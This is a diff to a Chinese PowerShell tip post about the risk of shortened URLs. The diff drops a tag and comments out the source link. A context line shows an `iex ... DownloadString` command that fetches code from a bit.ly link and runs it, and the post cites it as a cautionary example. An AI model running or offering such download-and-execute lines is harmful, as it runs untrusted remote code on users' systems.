@@ -11,7 +11,6 @@ tags:
 - tip
 - powertip
 - series
-- translation
 ---
 URL 缩短功能对于 Twitter 消息十分有用，但是隐藏了真实地址。您是否真的信任 http://bit.ly/e0Mw9w 呢？
 
@@ -34,5 +33,4 @@ iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
 
 这是一个能说明 `Invoke-Expression` 别名为“iex”有危险的很好例子。
 
-<!--more-->
-本文国际来源：[Uncovering TinyUrls’ True Origin](http://community.idera.com/powershell/powertips/b/tips/posts/uncovering-tinyurls-true-origin)
+<!--本文国际来源：[Uncovering TinyUrls’ True Origin](http://community.idera.com/powershell/powertips/b/tips/posts/uncovering-tinyurls-true-origin)-->
